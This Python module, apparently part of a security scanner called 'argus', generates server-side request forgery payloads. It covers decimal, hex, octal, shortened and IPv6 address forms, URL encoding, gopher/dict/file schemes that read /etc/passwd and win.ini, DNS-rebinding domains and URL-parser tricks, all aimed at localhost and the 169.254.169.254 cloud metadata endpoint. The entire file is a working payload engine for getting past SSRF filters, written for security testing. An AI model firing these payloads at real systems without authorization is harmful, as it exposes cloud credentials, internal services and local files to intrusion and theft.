"""ssrf: Payload generation."""
from __future__ import annotations

import urllib.parse
from typing import Any, Dict, List, Optional, Set

from argus.collectors.ssrf.models import DEFAULT_INTERNAL_SERVICE_TARGETS, DEFAULT_SSRF_TARGETS, DEFAULT_TIMING_TARGETS


class SSRFPayloadGenerator:
    """
    Comprehensive SSRF Payload Generator and Mutation Engine.
    Implements 9 distinct bypass mutation strategies to circumvent IP/hostname
    and protocol validation filters.
    """

    @staticmethod
    def ip_to_decimal(ip: str) -> Optional[int]:
        """Converts an IPv4 address string to its 32-bit decimal integer representation."""
        try:
            octets = [int(p) for p in ip.strip().split(".")]
            if len(octets) != 4:
                return None
            for octet in octets:
                if not (0 <= octet <= 255):
                    return None
            return (octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3]
        except Exception:
            return None

    def mutate_decimal_ip(self, host: str, path: str = "/") -> List[str]:
        """
        Strategy 1: Decimal IP Notation.
        Converts IPv4 addresses (e.g. 127.0.0.1 -> 2130706433, 169.254.169.254 -> 2852039166).
        """
        clean_path = ("/" + path.lstrip("/")) if path else "/"
        dec_val = self.ip_to_decimal(host)
        if dec_val is not None:
            return [
                f"http://{dec_val}{clean_path}",
                f"https://{dec_val}{clean_path}",
                f"{dec_val}",
            ]
        # If not direct IPv4, provide standard localhost/metadata decimals
        return [
            f"http://2130706433{clean_path}",
            f"http://2852039166{clean_path}",
        ]

    def mutate_hex_ip(self, host: str, path: str = "/") -> List[str]:
        """
        Strategy 2: Hexadecimal IP Notation.
        Converts IPv4 to 32-bit hex (0x7f000001) and dotted hex (0x7f.0x0.0x0.0x1, 0xa9fea9fe).
        """
        clean_path = ("/" + path.lstrip("/")) if path else "/"
        variants = []
        try:
            octets = [int(p) for p in host.strip().split(".")]
            if len(octets) == 4 and all(0 <= o <= 255 for o in octets):
                # 32-bit hex
                dec_val = (octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3]
                hex_32 = f"0x{dec_val:08x}"
                variants.append(f"http://{hex_32}{clean_path}")

                # Dotted hex
                dotted_hex = ".".join(f"0x{o:x}" for o in octets)
                variants.append(f"http://{dotted_hex}{clean_path}")

                # Mixed hex
                mixed_hex = f"0x{octets[0]:x}.{octets[1]}.{octets[2]}.{octets[3]}"
                variants.append(f"http://{mixed_hex}{clean_path}")
        except Exception:
            pass

        if not variants:
            variants.extend([
                f"http://0x7f000001{clean_path}",
                f"http://0x7f.0x0.0x0.0x1{clean_path}",
                f"http://0xa9fea9fe{clean_path}",
                f"http://0xa9.0xfe.0xa9.0xfe{clean_path}",
            ])
        return variants

    def mutate_octal_ip(self, host: str, path: str = "/") -> List[str]:
        """
        Strategy 3: Octal IP Notation.
        Converts IPv4 to octal notation (0177.0.0.1, 017700000001, 0251.0376.0251.0376).
        """
        clean_path = ("/" + path.lstrip("/")) if path else "/"
        variants = []
        try:
            octets = [int(p) for p in host.strip().split(".")]
            if len(octets) == 4 and all(0 <= o <= 255 for o in octets):
                # Dotted octal
                dotted_octal = ".".join(f"{o:04o}" for o in octets)
                variants.append(f"http://{dotted_octal}{clean_path}")

                # Dotted mixed octal
                mixed_octal = f"{octets[0]:04o}.{octets[1]}.{octets[2]}.{octets[3]}"
                variants.append(f"http://{mixed_octal}{clean_path}")

                # 32-bit octal
                dec_val = (octets[0] << 24) + (octets[1] << 16) + (octets[2] << 8) + octets[3]
                oct_32 = f"{dec_val:012o}"
                variants.append(f"http://0{oct_32.lstrip('0') or '0'}{clean_path}")
        except Exception:
            pass

        if not variants:
            variants.extend([
                f"http://0177.0.0.1{clean_path}",
                f"http://017700000001{clean_path}",
                f"http://0251.0376.0251.0376{clean_path}",
            ])
        return variants

    def mutate_shortened_ip(self, host: str, path: str = "/") -> List[str]:
        """
        Strategy 4: Shortened IP Notation.
        Uses class-A / class-B / zero representations (127.1, 127.0.1, 0, 0.0.0.0).
        """
        clean_path = ("/" + path.lstrip("/")) if path else "/"
        variants = [
            f"http://127.1{clean_path}",
            f"http://127.0.1{clean_path}",
            f"http://0{clean_path}",
            f"http://0.0.0.0{clean_path}",
        ]
        try:
            octets = [int(p) for p in host.strip().split(".")]
            if len(octets) == 4:
                # 2-part shortened: A.BCD
                a_bcd = f"{octets[0]}.{(octets[1] << 16) + (octets[2] << 8) + octets[3]}"
                variants.append(f"http://{a_bcd}{clean_path}")
                # 3-part shortened: A.B.CD
                ab_cd = f"{octets[0]}.{octets[1]}.{(octets[2] << 8) + octets[3]}"
                variants.append(f"http://{ab_cd}{clean_path}")
        except Exception:
            pass
        return variants

    def mutate_url_encoding(self, url: str) -> List[str]:
        """
        Strategy 5: URL Encoding & Double URL Encoding.
        Encodes characters and IP octets to bypass regex string filters.
        """
        single_enc = urllib.parse.quote(url, safe="")
        double_enc = urllib.parse.quote(single_enc, safe="")

        # Character-level percent encoding for host octets
        parsed = urllib.parse.urlparse(url)
        host = parsed.netloc or parsed.path
        char_encoded_host = "".join(f"%{ord(c):02X}" for c in host)
        char_enc_url = url.replace(host, char_encoded_host)

        return [
            single_enc,
            double_enc,
            char_enc_url,
            urllib.parse.quote_plus(url),
        ]

    def mutate_alternative_schemes(self, host: str, port: Optional[int] = None, path: str = "") -> List[str]:
        """
        Strategy 6: Alternative URI Schemes.
        Tests non-HTTP protocols (dict://, gopher://, file:///, ldap://, tftp://).
        """
        clean_path = path.lstrip("/")
        p = port or 11211
        return [
            f"dict://{host}:{p}/",
            f"gopher://{host}:{port or 6379}/_INFO",
            f"file:///etc/passwd",
            f"file:///etc/hosts",
            f"file:///c:/windows/win.ini",
            f"ldap://{host}:{port or 389}/",
            f"tftp://{host}:{port or 69}/",
        ]

    def mutate_ipv6(self, host: str, path: str = "/") -> List[str]:
        """
        Strategy 7: IPv6 Representations.
        Tests IPv6 loopbacks, IPv4-mapped IPv6, and expanded IPv6 notations.
        """
        clean_path = ("/" + path.lstrip("/")) if path else "/"
        return [
            f"http://[::1]{clean_path}",
            f"http://[::]{clean_path}",
            f"http://[::ffff:127.0.0.1]{clean_path}",
            f"http://[::ffff:a9fe:a9fe]{clean_path}",
            f"http://[0:0:0:0:0:ffff:127.0.0.1]{clean_path}",
            f"http://[0000:0000:0000:0000:0000:0000:0000:0001]{clean_path}",
            f"http://[::1]:80{clean_path}",
        ]

    def mutate_dns_rebinding(self, host: str, path: str = "/") -> List[str]:
        """
        Strategy 8: DNS Rebinding & Alternative Localhost Domains.
        Uses wildcard DNS services and alternative loopback hostnames.
        """
        clean_path = ("/" + path.lstrip("/")) if path else "/"
        return [
            f"http://localhost{clean_path}",
            f"http://127.0.0.1.nip.io{clean_path}",
            f"http://localtest.me{clean_path}",
            f"http://customer.localhost{clean_path}",
            f"http://169.254.169.254.nip.io{clean_path}",
            f"http://spoofed.burpcollaborator.net{clean_path}",
            f"http://app.localtest.me{clean_path}",
        ]

    def mutate_parser_ambiguity(self, host: str, path: str = "/") -> List[str]:
        """
        Strategy 9: URL Parser Ambiguity & Credential Tricks.
        Exploits discrepancies in URL authority/path parsing between frontend and backend.
        """
        clean_path = ("/" + path.lstrip("/")) if path else "/"
        return [
            f"http://{host}:80@target.com{clean_path}",
            f"http://target.com#@{host}{clean_path}",
            f"http://target.com@{host}{clean_path}",
            f"http://{host}?.target.com{clean_path}",
            f"http://{host}#target.com{clean_path}",
            f"http://target.com.{host}{clean_path}",
            f"http://{host}:80#@target.com/",
            f"http://user:pass@{host}{clean_path}",
            f"http://target.com@{host}:80{clean_path}",
        ]

    def generate_mutated_payloads(self, target_url: str) -> List[str]:
        """
        Generates a comprehensive, deduplicated list of mutated payloads for a given target URL
        using all 9 bypass mutation strategies.
        """
        variants: List[str] = [target_url]
        parsed = urllib.parse.urlparse(target_url)
        host = parsed.hostname or (parsed.netloc.split(":")[0] if parsed.netloc else target_url)
        port = parsed.port
        path = parsed.path or "/"
        if parsed.query:
            path = f"{path}?{parsed.query}"

        # 1. Decimal IP
        variants.extend(self.mutate_decimal_ip(host, path))

        # 2. Hex IP
        variants.extend(self.mutate_hex_ip(host, path))

        # 3. Octal IP
        variants.extend(self.mutate_octal_ip(host, path))

        # 4. Shortened IP
        variants.extend(self.mutate_shortened_ip(host, path))

        # 5. Alternative Schemes
        variants.extend(self.mutate_alternative_schemes(host, port, path))

        # 6. IPv6
        variants.extend(self.mutate_ipv6(host, path))

        # 7. DNS Rebinding / Localhost Domains
        variants.extend(self.mutate_dns_rebinding(host, path))

        # 8. Parser Ambiguity
        variants.extend(self.mutate_parser_ambiguity(host, path))

        # 9. URL Encoding variations for the top generated payloads
        url_enc_variants = []
        for v in variants[:15]:
            url_enc_variants.extend(self.mutate_url_encoding(v))
        variants.extend(url_enc_variants)

        # Deduplicate preserving order
        seen: Set[str] = set()
        unique_variants: List[str] = []
        for item in variants:
            if item and item not in seen:
                seen.add(item)
                unique_variants.append(item)

        return unique_variants

    def generate_cloud_metadata_payloads(self) -> List[Dict[str, Any]]:
        """Returns catalog of cloud metadata target probes."""
        return list(DEFAULT_SSRF_TARGETS)

    def generate_internal_service_payloads(self) -> List[Dict[str, Any]]:
        """Returns catalog of internal service target probes."""
        return list(DEFAULT_INTERNAL_SERVICE_TARGETS)

    def generate_timing_payloads(self, delay: float = 5.0) -> List[Dict[str, Any]]:
        """Returns catalog of differential timing probe targets."""
        return list(DEFAULT_TIMING_TARGETS)
